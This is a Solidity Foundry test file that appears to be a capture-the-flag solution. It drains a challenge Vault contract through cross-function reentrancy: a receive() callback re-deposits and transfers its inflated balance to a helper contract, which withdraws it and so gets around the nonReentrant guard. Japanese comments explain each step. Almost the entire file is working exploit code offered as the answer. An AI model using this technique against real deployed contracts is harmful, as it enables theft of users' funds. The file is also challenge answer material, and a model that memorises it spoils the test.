// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 10000 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        Exploit exploitContract = new Exploit(address(setup.vault()), payable(playerAddress));
        exploitContract.run{value: 1 ether}();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
    }
}

////////// YOUR CODE GOES HERE //////////
interface IVault {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external;
    function withdrawAll() external;
    function balanceOf(address addr) view external returns (uint256);
}

contract Exploit {
    IVault public vaultContract;
    address payable public player;

    event Received(address, uint256);

    ExploitSub exploitSubContract;

    constructor(address addr, address payable player_) {
        vaultContract = IVault(addr);
        exploitSubContract = new ExploitSub(addr, payable(address(this)));
        player = player_;
    }

    receive() external payable {
        if (msg.sender != address(exploitSubContract) && address(vaultContract).balance > 0) {
            // (1)に追加で、depositすることで、
            // 実質 本来の手持ち * 2 depositできる
            vaultContract.deposit{value: msg.value}();
            
            // ここまでで増やしたdepositをSubに渡すだけ
            // Subで引き出すことでnonReentrantを回避
            vaultContract.transfer(
                address(exploitSubContract),
                vaultContract.balanceOf(address(this))
            );
        }
    }

    function run() external payable {
        while(true){
            if(address(this).balance > address(vaultContract).balance) break;
            // 手持ちを全部deposit (1)
            vaultContract.deposit{value: address(this).balance}();
            vaultContract.withdrawAll();

            exploitSubContract.run();
        }

        // 本来の手持ち*2で、引き出し続けて、残ったbalanceを、残さず引き出す
        vaultContract.deposit{value: address(vaultContract).balance}();
        vaultContract.withdrawAll();
        exploitSubContract.run();

        player.transfer(address(this).balance);
    }
}

contract ExploitSub {
    IVault public vaultContract;
    address payable public exploitContractAddr;

    constructor(address vAddr, address payable eAddr) {
        vaultContract = IVault(vAddr);
        exploitContractAddr = eAddr;
    }

    // これがないと動かない
    receive() external payable {}

    function run() external payable {
        if (address(vaultContract).balance > 0) {
            // 本来の手持ち*2 depositされているので、それを引き出す
            vaultContract.withdrawAll();

            // 引き出したのを再度depositに使うためメインコントラクトに送る
            (bool success,) = exploitContractAddr.call{value: address(this).balance}("");
            require(success);
        }
    }
}
////////// YOUR CODE END //////////
